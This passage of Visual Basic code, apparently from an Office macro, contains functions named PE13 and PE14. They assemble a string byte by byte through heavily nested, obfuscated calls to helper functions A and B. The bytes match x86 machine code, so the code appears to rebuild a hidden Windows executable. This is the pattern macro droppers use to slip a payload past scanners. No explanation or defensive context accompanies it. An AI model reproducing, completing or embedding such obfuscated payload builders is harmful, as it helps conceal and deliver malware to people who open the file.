    strPE = A(B(A(A(A(A(A(A(B(A(A(A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(B(A(A(A(A(B(A(B(A(strPE, 187), ".F#"), 219), "}"), 150), 139), 203), 184), "0000"), 247), 17), 137), "M"), 12), 210), 209), 139), 254), 193), 233), 2), 243), 171), 6), "n)"), 203), 3), 243), 170), "Z}"), 217), 139), 194), 139), "U"), 5), 130), 216), 3), 174), 139), "E"), 248)
    strPE = A(A(A(A(A(B(A(A(B(A(B(A(B(A(B(A(A(B(A(B(A(A(A(A(A(A(B(A(A(A(A(A(A(B(A(A(A(A(A(A(B(A(strPE, 137), "]"), 208), 185), 1), 27), 0), 0), ";"), 249), 139), 22), 138), 207), 136), "fF@;"), 203), 3), 4), 198), 6), 237), "FA0"), 207), "~"), 237), 139), "U"), 222), ";"), 251), "}"), 34), "+"), 223), 151), "0000"), 139), 203), 139), 254), 139)
    strPE = A(B(A(A(A(A(B(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(B(A(B(A(B(A(A(B(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(strPE, 138), 193), 224), 2), 243), 171), 139), 202), 131), 225), "{"), 3), 30), 243), 170), 149), 6), "."), 195), 171), "aF"), 138), "F"), 255), "[<"), 198), 15), 133), 151), 0), 134), 0), 139), "E"), 24), 133), 182), 139), 194), 15), "YX"), 17), 0), 0), 198), "F"), 255)
    strPE = B(A(A(A(B(A(A(A(A(B(A(A(A(B(A(A(A(B(A(B(A(A(A(A(B(A(B(A(A(A(B(A(A(A(A(A(A(B(A(A(B(A(strPE, 20), "_^"), 144), 229), "]"), 195), 131), 251), 253), 15), 141), "P"), 255), 255), 255), "KF"), 137), "]"), 12), 138), 16), 136), "V"), 255), "@"), 198), 6), 243), "F"), 131), 255), 1), "~DO"), 144), 8), 136), 14), "F@Ou"), 247), 216), 6), "eN")
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(B(A(B(A(A(A(A(A(A(strPE, 133), 219), 196), 7), 247), 188), "x"), 6), "-"), 192), 236), 198), 6), "+"), 139), 195), 185), 195), 0), 0), 0), 8), 252), 249), "F"), 133), 10), 163), 250), "~"), 5), 4), "K("), 6), "*"), 31), 195), 174), 133), 0), 0), 0), 191), 247), 249), 133), 192), 139), 202)
    strPE = A(B(A(B(A(B(A(B(A(A(A(A(A(A(A(A(B(A(A(A(B(A(A(B(A(A(B(A(A(A(A(A(A(A(A(B(A(A(B(A(A(B(A(A(B(strPE, "~"), 23), 184), "gfff"), 247), 239), "d"), 250), 2), "+"), 194), 193), 232), 31), 3), 208), 128), 194), "0"), 136), 22), "F"), 128), 193), "0"), 191), 14), 233), "Y"), 255), 255), 255), 139), 194), 198), 6), 0), "_^"), 139), "Hm"), 144), "X"), 144), "U"), 139)
    strPE = A(A(A(B(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(A(A(A(B(A(A(A(B(A(B(A(B(A(B(A(B(A(B(A(A(B(A(A(B(A(A(strPE, 236), 139), "E"), 28), 139), "M"), 24), 139), "U"), 20), "P"), 139), "E"), 16), "j"), 1), "Q"), 139), "MqR"), 139), 169), 8), "PQR="), 14), 0), 0), 0), 188), "~"), 28), "]"), 195), 144), 144), 144), 162), 144), 146), 144), 144), 144), "0"), 139), 236), 131)
    strPE = A(A(B(A(A(A(B(A(A(B(A(A(A(A(A(B(A(B(A(B(A(B(A(A(A(A(B(A(A(A(B(A(A(A(A(B(A(B(A(A(B(A(B(A(A(A(strPE, 236), 20), 131), "r"), 16), "O|"), 7), 199), "E"), 13), "N"), 0), 0), 0), 221), "E"), 8), 220), 29), "0"), 194), 236), 0), 139), "M"), 24), ","), 130), "] "), 139), "3"), 246), 218), 3), 158), 137), "u"), 252), 137), "17V"), 5), 139), 251), "z"), 14), 27)
    strPE = A(A(A(B(A(A(A(A(B(A(B(A(A(B(A(A(B(A(A(B(A(A(A(A(B(A(B(A(A(B(A(A(B(A(A(A(A(A(A(A(A(B(A(A(A(A(A(strPE, 147), 158), 0), 224), 221), "]"), 8), 22), 1), 237), 0), 0), 0), 139), "M"), 12), 139), "U"), 8), 141), "E"), 236), "PQR"), 255), 21), 24), 193), "@"), 212), 221), "]"), 8), 221), "E"), 236), 220), "b0"), 194), "@"), 0), 173), 196), 139), "M"), 224), 246), 196)
    strPE = B(A(A(A(B(A(A(A(A(A(A(A(B(A(B(A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(B(A(B(A(B(A(B(A(B(strPE, "D{r"), 233), "sP;"), 243), "vX"), 221), "E"), 236), "Fl0"), 194), 177), 0), 223), 12), 246), 196), "D{H"), 221), 244), 236), 220), "Y"), 16), 195), "@Z"), 141), "E"), 236), 244), 131), 236), 8), 221), 28), "$"), 218), 21), 24), "L%")
    strPE = B(A(A(B(A(B(A(A(B(A(A(A(A(A(A(B(A(B(A(A(B(A(A(A(B(A(A(A(A(B(A(A(A(A(B(A(A(A(B(A(A(B(A(A(strPE, 0), 221), "]"), 155), 221), "E[V"), 5), 229), 195), "@"), 0), 131), 196), 12), "N"), 220), 13), 0), 195), "Q"), 0), 232), 218), "5X"), 183), 139), "] "), 177), "0*"), 200), 237), 14), 139), 183), 252), "A;"), 243), 137), "M"), 252), "w"), 168), 141), "C")
    strPE = A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(B(A(A(B(A(B(A(A(A(B(A(A(A(B(A(A(B(A(B(A(B(A(A(A(A(B(A(B(strPE, "P;"), 246), "s\"), 138), 22), 136), 23), "GF;"), 26), "r"), 246), "<"), 138), 221), "E"), 8), 220), 137), "0V@"), 0), 223), 224), "%"), 142), "A"), 0), 0), "u"), 157), 221), 148), 8), 220), 13), 248), 194), "@"), 0), 221), "v"), 244), 217), 192), 220)
    strPE = A(B(A(A(A(A(B(A(B(A(B(A(B(A(A(B(A(B(A(B(A(B(A(A(A(B(A(A(A(A(A(B(A(B(A(A(A(A(B(A(B(A(strPE, 29), "("), 194), "6b"), 223), 224), 246), 196), "Iz!"), 221), "U"), 8), 220), 13), 28), 194), "@HN>"), 192), 220), 29), "O"), 194), "R"), 0), "!"), 224), "w"), 196), 5), "{e"), 221), "]H"), 137), "u"), 252), "t"), 191), 221), 216), 139), "N"), 16)
    strPE = B(A(B(A(A(A(B(A(B(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(B(A(B(A(B(A(A(B(A(A(B(A(B(A(B(A(A(B(A(strPE, 243), "4"), 24), 139), "E"), 28), "Q"), 192), "u"), 3), 3), "u"), 252), 139), "M"), 20), ";"), 243), "s"), 19), 139), "E"), 16), 173), "R"), 216), 137), 1), 198), 3), 0), 139), 195), 141), "["), 139), 253), "]"), 195), 139), "U"), 252), ";"), 254), 137), 17), "w<"), 221), "E")
    strPE = A(A(A(B(A(A(A(A(A(A(B(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(B(A(A(A(A(B(A(A(B(A(B(A(B(A(A(strPE, 8), 141), " P;"), 181), "s0"), 220), "R"), 164), 178), "@"), 0), 141), 155), 244), "P"), 131), 195), 8), 221), 28), "$"), 255), 21), 24), 219), 139), 19), 221), "Eq"), 131), 196), 12), 232), 5), "5"), 0), 0), 139), 147), 20), 139), "] "), 4), 25), 136)
    strPE = B(A(A(B(A(B(A(A(B(A(A(B(A(A(A(A(A(B(A(A(A(B(A(A(B(A(A(A(B(A(B(A(B(A(A(A(A(B(A(B(A(strPE, 7), "G;"), 254), "v"), 201), 221), 167), 141), "SP;"), 242), "r"), 13), "_}CO"), 0), 139), 195), "^["), 139), 229), "]"), 195), 138), 22), "5L"), 128), 12), 5), 128), 250), "-"), 136), 22), "~"), 6), 139), "U"), 28), ";%"), 198), 6), "0")
    strPE = A(A(B(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(B(A(B(A(A(A(A(A(A(B(A(B(A(A(A(B(A(A(A(B(A(B(A(A(A(A(B(strPE, "v"), 5), 252), 254), 6), "("), 20), "J"), 6), 4), 139), "9G"), 133), 210), 225), "9u"), 8), ";"), 195), 208), 3), 198), 0), 216), "@"), 128), ">9"), 127), 219), 198), 0), 148), 193), 139), 195), "^["), 139), 229), "]"), 195), 144), 144), 144), "t"), 144), 144)
    strPE = A(A(A(A(A(A(B(A(B(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(B(A(B(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(B(A(A(strPE, 144), 144), "@"), 144), 144), 144), 144), 144), 230), 139), 196), 139), "E"), 255), 139), "M"), 8), 140), "VW"), 34), "}"), 20), 133), 253), 139), 247), 150), 11), 139), "E"), 16), 199), 0), 0), 182), 0), 0), 235), 18), 139), "U"), 16), "O"), 192), 133), 201), 15), 224), 192)
    strPE = B(A(A(B(A(A(A(A(B(A(A(B(A(B(A(A(A(A(A(A(A(A(B(A(A(B(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(B(A(B(A(A(B(A(strPE, 133), "v"), 137), 2), "t"), 2), "}"), 217), 184), 205), 204), 204), "K"), 179), 10), 247), 225), 193), 234), 3), "/"), 194), ","), 246), 235), "d"), 200), 128), 193), 2), 136), 29), 139), 202), "k"), 210), "u"), 226), 139), "E"), 173), 13), 254), 16), "8"), 139), 198), "_^[")
    strPE = B(A(A(A(A(A(B(A(B(A(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(B(A(B(A(B(A(B(A(A(B(A(A(A(B(A(A(A(B(strPE, "]"), 195), 144), 144), "U"), 139), 236), 139), "\"), 12), 139), "M"), 16), "S"), 26), "#"), 8), "W"), 175), "z"), 139), 133), 192), "w@r"), 5), 131), 251), "ow"), 4), 133), 201), "u!"), 133), 192), 127), 226), "|"), 8), "p"), 207), 255), 255), 255), 127), "w*")
    strPE = A(A(B(A(A(B(A(A(A(B(A(A(A(A(A(A(B(A(B(A(B(A(B(A(A(B(A(A(B(A(A(A(B(A(B(A(A(A(A(A(A(B(A(A(A(strPE, 131), 248), 255), "|%"), 127), 8), 129), 251), 0), 0), "x"), 128), "r"), 27), 133), 196), "u"), 27), 139), "E"), 146), 139), "U"), 231), "P"), 200), "RGS"), 232), "O"), 255), 1), 255), 131), 137), 20), "_[b"), 195), 133), 177), "t"), 11), 139), "M"), 20), 199)
    strPE = A(B(A(A(B(A(A(B(A(A(B(A(A(A(B(A(B(A(A(A(B(A(A(B(A(A(A(A(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(A(A(A(strPE, 1), 0), 0), 0), 185), 235), "F)"), 192), 127), 13), "q"), 4), 133), 219), "sK"), 185), 1), 0), 0), 0), 235), 2), "3"), 201), 139), "U"), 20), 133), 201), "n"), 10), "t"), 138), 247), 252), ",$"), 0), 247), "<V"), 157), 0), "j"), 10), 142), "S"), 232)
    strPE = A(B(A(A(B(A(A(A(A(B(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(strPE, 170), "6"), 0), 0), 139), 200), 8), 242), 138), 193), 178), 10), 246), 234), 166), "qO"), 128), 206), "0"), 139), 198), 136), 31), 139), 217), 11), 206), "u"), 219), 1), 152), 24), 139), 139), 28), "+"), 199), "^"), 149), 1), 139), 199), "_g]"), 195), 144), "h"), 144)
    strPE = A(A(A(A(B(A(A(B(A(B(A(A(B(A(A(A(A(B(A(A(B(A(A(A(A(B(A(A(B(A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(A(A(B(A(A(strPE, 144), 144), "x"), 144), 230), 144), 144), 144), 144), 239), 144), 16), "U"), 139), 236), 138), 139), "E"), 8), 193), "V"), 139), 8), "Q"), 255), 21), 176), 193), "@"), 25), 139), "u"), 12), 139), 216), 141), "U"), 164), 141), "E"), 12), "R"), 139), 203), "VP"), 129), 225), 245), 0)
    strPE = A(B(A(B(A(A(B(A(B(A(B(A(A(A(A(B(A(A(B(A(A(B(A(A(A(B(A(B(A(A(B(A(B(A(B(A(A(A(A(B(A(B(A(B(A(A(A(A(strPE, 0), 0), 212), 5), "Q"), 137), "]"), 252), "b"), 157), 254), 255), 255), "H"), 202), "t"), 26), "RP"), 198), 0), "."), 141), "E"), 12), 190), 201), "P"), 138), 207), "j"), 1), 198), " "), 132), 254), 255), 255), "H"), 141), "U"), 8), "RP"), 232), 0), "."), 141), "E"), 12)
    strPE = B(A(B(A(B(A(A(A(B(A(A(A(A(A(A(B(A(A(A(A(B(A(B(A(A(A(B(A(B(A(B(A(A(A(B(A(B(A(B(A(B(A(B(A(A(strPE, 151), 201), "P"), 138), "L"), 254), "j"), 1), "Q"), 232), "j"), 254), 255), 255), "H"), 141), "U"), 8), "R"), 248), 198), 22), ".tE"), 12), "Pj"), 1), 193), 235), 194), "S"), 232), 208), 19), 182), 255), 139), "M"), 16), 131), 196), "P"), 1), "@"), 137), "1`[")
    strPE = A(A(B(A(A(A(A(A(A(A(A(B(A(B(A(B(A(B(A(B(A(B(A(A(B(A(B(A(B(A(B(A(B(A(A(B(A(A(B(A(A(A(A(A(A(strPE, 139), 133), 23), 195), 144), 144), "U"), 139), 236), "F"), 236), 8), "SV"), 141), "E~_"), 139), "}"), 12), "P"), 139), "f"), 8), 141), "M"), 248), "3B"), 168), "f"), 139), "P"), 12), "Qj"), 1), "R"), 232), 26), 254), 179), 255), 139), 137), 139), "E"), 8), 131)
    strPE = A(B(A(B(A(A(B(A(A(B(A(A(A(A(A(B(A(B(A(A(B(A(A(A(A(A(A(A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 196), 20), 175), 141), 183), 0), 254), 255), 255), 198), 3), 227), 139), "H"), 28), "<QV"), 232), 157), 234), 255), 255), 182), 192), "t"), 20), 139), "U"), 16), "K+"), 251), 139), 195), 198), 3), "?"), 137), 155), "_^["), 139), 229), "C]"), 139), "P"), 163)
    strPE = A(A(A(A(A(B(A(A(B(A(A(A(A(B(A(B(A(A(A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(A(A(A(B(A(A(strPE, 148), 255), "3"), 192), 24), 178), 247), 209), "I+"), 217), "I"), 232), 139), 251), 193), 233), 2), 243), 165), 139), 200), 139), "E"), 12), 131), 225), 3), "+"), 158), 243), 164), 139), "M"), 16), "_^"), 137), 1), 139), 223), "["), 139), 229), "]"), 195), 24), 144), 144), 144)
    strPE = A(B(A(A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(B(A(A(A(B(A(B(A(A(A(B(A(B(A(A(B(A(A(B(A(A(A(B(strPE, "U"), 139), 236), 139), "M"), 16), 139), "E"), 8), 139), "E"), 12), "Q"), 139), 0), 141), "MhRQj"), 1), "P"), 232), 148), 253), "s"), 255), ","), 9), 20), "]"), 195), 144), 144), 157), 144), 144), 144), 144), 144), 144), 144), "3"), 144), "b"), 144), 144), "U"), 139)
    strPE = B(A(A(A(A(A(A(A(A(B(A(B(A(B(A(A(B(A(B(A(A(B(A(A(B(A(B(A(B(A(A(B(A(A(A(A(A(A(A(strPE, 236), 131), 240), 181), 138), 232), 8), "S3"), 139), 182), " W"), 139), "}"), 183), "<fu"), 254), 139), "x"), 175), 141), "E"), 164), "PxE"), 245), 141), "UPQ"), 139), "M"), 12), "RWPQ"), 232), 192), 1), 0), 0), 235), 248), 232), "E")
    strPE = A(A(A(A(B(A(B(A(B(A(B(A(A(A(A(A(B(A(B(A(B(A(A(A(A(B(A(A(B(A(A(B(A(B(A(B(A(A(B(A(B(A(B(A(B(A(B(A(B(strPE, "'"), 141), "U"), 164), "R"), 141), "M"), 24), "P"), 29), "E"), 128), 141), "W"), 1), "Q"), 139), "M"), 12), 181), "PQ"), 232), 1), "c"), 255), 255), 139), 21), "t"), 193), "@"), 0), "X"), 182), 131), 196), 24), 131), ":"), 164), "~"), 13), "3"), 192), "h"), 3), 1), 0), 0)
    strPE = A(B(A(A(B(A(A(A(A(A(B(A(A(A(A(A(A(B(A(A(B(A(A(B(A(A(B(A(B(A(B(A(A(A(A(A(A(A(A(B(A(B(A(A(B(A(A(strPE, 190), 3), "P"), 255), 21), "h"), 193), "@"), 0), 131), 196), 8), 235), 21), 139), 21), "x"), 208), "n"), 0), "3"), 201), 138), "b"), 226), 2), "f"), 139), 4), "Hh"), 223), 1), 0), 0), 215), 207), "t7"), 139), 251), 25), 155), 255), "3"), 192), 139), "U$"), 242)
    strPE = B(A(A(A(B(A(B(A(A(A(A(A(A(A(A(A(B(A(B(A(A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(B(A(B(strPE, ";"), 190), "E `"), 243), 247), 24), "I"), 139), 248), 137), 10), 168), 139), 209), 193), 133), 2), 243), "K"), 139), 202), 131), 225), "I"), 243), 164), 139), "M"), 28), "_^"), 138), 199), 1), 0), 0), 0), 220), 139), 229), "]U"), 138), "U"), 8), 234), 250), "f")
    strPE = A(A(A(A(A(A(A(A(B(A(A(A(A(B(A(A(A(A(A(B(A(A(A(B(A(B(A(B(A(A(A(B(A(A(A(A(B(A(B(strPE, "ul"), 139), "E"), 248), 133), 192), 127), "Atu"), 192), 249), 6), "0Fp"), 154), "~M("), 4), ".F"), 133), 192), 166), "("), 247), 216), 139), 201), 137), "E"), 18), 139), 209), 184), "0000"), 139), 254), 13), 233), 2), 243), 171), 139)
    strPE = A(B(A(A(A(A(B(A(B(A(B(A(A(A(A(B(A(B(A(A(A(A(B(A(B(A(A(B(A(B(A(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(strPE, 202), 131), 225), 3), 248), 170), 139), "E"), 209), 139), 202), "CU"), 8), 3), 241), 185), 193), "@"), 210), "E"), 227), 6), "?HF"), 137), "E"), 30), 138), 11), 136), "N"), 255), ","), 133), 192), 127), 251), "H"), 133), "p"), 137), "E"), 24), 127), 7), 139), "M"), 20)
    strPE = B(A(A(B(A(A(B(A(A(A(A(A(B(A(B(A(B(A(A(A(B(A(A(A(A(A(B(A(A(A(A(A(B(A(A(A(B(A(A(A(A(B(A(B(strPE, "k"), 147), "t"), 178), 198), 6), 8), "F"), 235), 27), 139), "uQ"), 138), 3), 136), 202), 185), "C"), 133), 255), 145), 7), 139), "E"), 20), 133), 192), "t"), 4), "M3.F"), 139), "E"), 24), 138), 11), 132), 201), "t8"), 136), 14), "|K"), 1), 20), "C")
    strPE = A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(B(A(A(A(B(A(B(A(A(B(A(B(A(B(A(B(A(A(A(B(A(A(A(B(A(A(strPE, 132), 201), "u"), 148), 128), 250), "ft"), 174), 136), 22), "FH"), 137), "E"), 24), "tS"), 141), "M"), 28), 141), "U"), 254), "Q"), 141), 228), 233), "RQjyO"), 232), 250), 251), 255), 255), 184), "]u"), 131), 196), 20), 139), 128), 28), 133), 219), 15)
    strPE = A(A(A(B(A(B(A(B(A(A(B(A(A(B(A(A(A(A(B(A(A(A(A(B(A(A(A(A(A(B(A(B(A(B(A(B(A(A(B(A(strPE, 149), "KF"), 131), 249), "x"), 141), "T"), 18), "="), 136), "V"), 15), 216), 6), 198), 25), "0F"), 204), 4), 133), 201), "t"), 167), 138), 16), 136), "~F@Iu"), 247), 139), "E"), 241), 143), "M$+"), 240), "_"), 137), "d^["), 139), 229), 186)
    strPE = A(B(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(B(A(A(A(B(A(B(A(B(A(B(A(B(A(A(B(A(B(A(A(A(strPE, 195), 198), 6), "+g"), 198), "V0F"), 198), 6), "0F"), 139), "E "), 139), "M$+"), 240), "_"), 137), "1^"), 27), 139), 229), "]"), 195), 144), 144), 144), 144), 167), 144), 144), "("), 144), 144), 144), 144), 144), 144), 129), 139), 236), 139), "E"), 28)
    strPE = B(A(B(A(A(B(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(B(A(B(A(A(A(B(A(B(A(B(A(A(A(B(A(A(A(A(A(A(strPE, 139), 146), 24), 139), 15), 209), "P"), 139), 128), 16), "j"), 0), "Q"), 139), "HoR"), 139), 204), 228), "PQR"), 232), "n"), 249), 255), 255), 131), 218), 195), "]"), 24), 144), 144), 144), 144), 254), 144), 144), 144), "cU"), 139), 236), "SHW"), 139), "}")
    strPE = B(A(A(A(A(A(B(A(A(B(A(B(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(B(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(strPE, 12), 190), 1), 0), 0), 2), 139), 207), 163), "Ei/"), 188), 194), "@"), 0), 211), 230), 202), "M"), 145), "N"), 190), 249), "XtR"), 187), 168), 127), 136), 0), 26), 5), 8), 208), 206), "H#"), 202), "."), 12), 25), "P"), 8), 139), 207), 211), 234), "~")
    strPE = B(A(A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(A(B(A(B(A(B(A(A(A(B(A(A(A(A(A(B(A(A(B(A(B(A(B(A(A(A(B(A(A(A(strPE, 210), 14), 238), "*"), 221), 20), 172), "U"), 24), "+"), 200), "J^"), 240), 157), "[]"), 195), 144), 144), 144), 144), "U"), 139), 236), 202), "M"), 16), "SV"), 138), "E"), 20), 208), 191), 1), 0), 0), 191), 139), "u"), 24), 187), 228), 194), "@"), 0), 211), 231), "O")

    PE13 = strPE
End Function

Private Function PE14() As String
   Dim strPE As String

    strPE = ""
    strPE = B(A(A(A(A(A(A(B(A(B(A(A(B(A(A(A(A(B(A(B(A(A(B(A(B(A(A(B(A(A(A(A(A(B(A(A(B(A(A(B(A(A(A(A(B(strPE, "<Xt"), 13), 5), 208), 194), "@"), 0), 139), "U"), 203), 139), "E"), 10), 133), 210), 29), 34), "r"), 5), 131), "g"), 255), "w"), 27), 139), "U"), 28), "R"), 139), 247), 24), 253), ":"), 11), 20), "RQP"), 232), "g"), 255), 161), 255), 131), 196), 20), "_^")
    strPE = B(A(A(A(A(A(A(B(A(A(A(A(B(A(B(A(B(A(A(B(A(B(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(B(strPE, "[]"), 186), 139), 200), "Y#"), 207), 138), 12), 25), 136), 26), 139), "M"), 16), 232), 189), 163), 0), 0), 139), 200), 11), 202), "u/"), 139), "E"), 24), 139), "U"), 154), "+"), 198), "_"), 137), 2), 139), 252), "^[]"), 195), 144), 213), 144), 144), 144), "_")
    strPE = B(A(B(A(A(B(A(A(A(B(A(B(A(B(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(B(A(B(A(A(B(A(A(B(A(A(B(A(A(B(strPE, "U"), 139), 236), ")M"), 227), 139), "E"), 8), 139), "UCQ"), 232), 0), "y"), 228), "VjKP"), 6), 22), 255), 255), 255), 131), 196), 20), "]"), 218), 144), "U"), 139), 16), 131), "f"), 8), "V"), 139), "u"), 12), 133), 246), "u"), 8), 137), "u"), 248), "-")
    strPE = A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(B(A(A(B(A(B(A(B(A(A(B(A(A(B(A(A(B(A(A(B(A(A(A(A(A(A(A(B(strPE, "u"), 252), 235), 13), 139), 247), 8), 137), "E"), 248), 141), "D0"), 255), 137), "E"), 238), 139), "U"), 16), 141), "M"), 20), "QnE"), 248), "fPh"), 208), 134), "@"), 0), 232), 23), 197), 255), 255), 133), 246), "t"), 6), 139), "M"), 248), 198), 1), 0), 131)
    strPE = B(A(B(A(A(B(A(A(B(A(B(A(B(A(A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(B(A(B(A(A(strPE, 248), 255), "ux"), 141), "7"), 202), "^"), 139), 156), "]"), 195), 131), 200), 255), 195), 130), 144), 144), 144), 14), 144), 144), "|"), 144), 204), 144), 144), "U"), 139), 236), 139), "E"), 8), "= N"), 0), ";}"), 21), 139), "M"), 16), 139), "U"), 10), "QFP")
    strPE = A(B(A(A(A(A(A(B(A(A(A(A(B(A(A(B(A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(strPE, 232), 133), 3), 0), 0), 131), 196), 16), "]"), 194), 12), 137), 16), 192), 139), 8), 31), 182), 27), 189), 232), 194), 0), 180), 0), 139), "M"), 12), "P"), 139), "E<P"), 3), 232), "c"), 0), 0), 0), 131), "H"), 16), 254), 194), 12), 0), "D09"), 10)
    strPE = A(A(B(A(B(A(B(A(A(B(A(A(B(A(A(B(A(A(B(A(B(A(A(A(B(A(A(A(A(A(B(A(B(A(A(B(A(B(A(A(B(A(A(B(A(strPE, 0), "}"), 25), 139), "U"), 16), 139), "E"), 12), "h"), 245), 19), "@cRP"), 232), "C>"), 160), 0), 131), 196), 218), "]"), 194), 12), 0), "="), 128), " "), 10), 27), "}"), 25), 139), "M"), 16), 139), "U"), 21), 10), "T"), 239), "@"), 134), "QR"), 232), 178)
    strPE = B(A(B(A(B(A(A(B(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(B(A(A(B(A(B(A(A(A(A(A(A(B(A(A(A(B(A(A(A(A(B(A(strPE, 0), "-"), 0), 131), 196), 12), "]"), 17), 1), 226), "%'"), 12), 5), 128), 3), 245), 152), "P"), 139), "EaPQ"), 190), 142), "-"), 0), 0), 131), 196), 12), "]"), 194), 12), 0), 144), 144), 239), 139), 236), 139), "E"), 214), 139), "M"), 16), "V"), 139), "u")
    strPE = A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(B(A(A(A(A(B(A(strPE, 8), "PQ"), 200), 232), 187), 227), "Z"), 0), 149), 198), 196), "]"), 195), 144), 144), 144), 144), 144), 144), 169), 139), 236), 139), "E"), 8), "=q"), 17), 1), 0), 15), 143), 195), "}"), 0), 187), 219), 132), 182), 0), 0), 0), "n"), 222), 177), ")"), 255), 131), 248)
    strPE = A(A(B(A(B(A(B(A(A(B(A(A(A(A(B(A(B(A(B(A(A(B(A(B(A(B(A(A(A(A(B(A(B(A(B(A(A(A(B(A(A(A(B(A(B(A(strPE, 25), "@"), 135), "7"), 1), 0), 0), "h$"), 133), 4), 137), "@+"), 184), "Q"), 0), "A"), 0), 184), 195), 25), "`"), 24), "A"), 26), "]"), 195), 184), "C"), 5), "s"), 0), "]"), 195), 9), 16), 0), "Aj]"), 195), 184), "u"), 255), "@"), 0), "]"), 195), 184)
    strPE = B(A(A(B(A(B(A(A(A(A(B(A(B(A(A(A(A(B(A(B(A(A(A(A(B(A(B(A(B(A(A(B(A(B(A(B(A(A(B(A(B(A(A(A(A(B(A(B(A(A(strPE, 180), 243), "@"), 0), "]"), 229), 184), 136), 255), "@"), 0), "]"), 195), 184), "P"), 255), "@"), 0), "]"), 195), 184), "H"), 255), "@"), 0), "]"), 195), 199), 240), 254), "@"), 0), "]"), 195), 184), 180), 254), "J"), 0), "]"), 195), 189), 209), 254), "@"), 0), " "), 148), 6), "|")
    strPE = A(B(A(B(A(A(A(A(A(A(B(A(B(A(A(A(A(B(A(A(A(A(B(A(B(A(B(A(B(A(B(A(A(B(A(B(A(B(A(A(B(A(B(A(strPE, 254), "@"), 0), "]"), 195), 184), "T"), 254), "@(]"), 195), "`"), 199), 254), "F"), 225), "]"), 195), "qz"), 254), "@"), 0), "]"), 195), 184), 244), 253), "@a]"), 191), 186), 139), 14), "b"), 0), "]"), 195), 184), 172), 253), 204), 0), "]"), 178), "dl"), 253)
    strPE = A(A(B(A(B(A(B(A(B(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(B(A(A(A(A(A(A(B(A(B(A(A(B(A(B(A(B(A(B(A(B(A(B(strPE, "@"), 0), "]D"), 184), "<"), 253), "@"), 0), "]"), 195), "v"), 28), 253), "@"), 0), "]"), 195), 184), 12), 253), 229), 0), "]"), 195), 184), "Y"), 252), "@)]"), 195), 143), 142), 168), 254), 255), 131), 248), 22), 247), "~"), 223), "$"), 133), "f"), 137), "@"), 0), 184)
    strPE = B(A(A(B(A(B(A(A(A(A(B(A(A(A(A(B(A(B(A(B(A(A(B(A(A(A(A(A(A(B(A(B(A(A(A(A(B(A(B(A(B(A(A(B(A(A(A(B(strPE, "p"), 252), 6), 0), "]"), 195), 184), "H"), 252), "@"), 0), "A"), 195), 184), 254), 252), "@"), 217), "]"), 195), 211), 240), 251), 231), 0), "]"), 195), 184), "r"), 251), "@"), 0), "]"), 195), 184), 152), 251), "@"), 0), 14), 195), 184), "`"), 213), "@o"), 7), 195), "/8")
    strPE = A(A(A(A(A(A(B(A(B(A(A(B(A(A(A(B(A(A(B(A(B(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(B(A(A(B(A(strPE, 251), "@PA"), 195), 184), "c"), 251), "@"), 0), "F"), 156), 184), 236), 250), 29), 191), 26), 195), 184), 188), 250), "@"), 164), 180), 195), 184), 144), 133), "@"), 0), "2"), 195), 184), "d"), 250), 168), 0), "V"), 205), 184), "4"), 250), "@"), 0), 194), 195), 184), 240), 249)
    strPE = A(B(A(B(A(A(A(A(A(B(A(A(B(A(A(A(B(A(A(A(B(A(A(A(A(B(A(B(A(B(A(A(B(A(B(A(B(A(A(A(A(A(A(A(A(A(B(A(B(strPE, "@"), 0), "]"), 195), 184), 180), 249), 244), 0), 239), 195), 184), "m"), 249), "@"), 0), "]"), 194), 184), "|"), 249), "h"), 0), "x"), 195), 144), 204), 135), "@"), 0), 252), 136), "@"), 143), 180), 135), "@+"), 218), 135), "R"), 0), 226), 135), 7), 0), "@"), 135), "@"), 0)
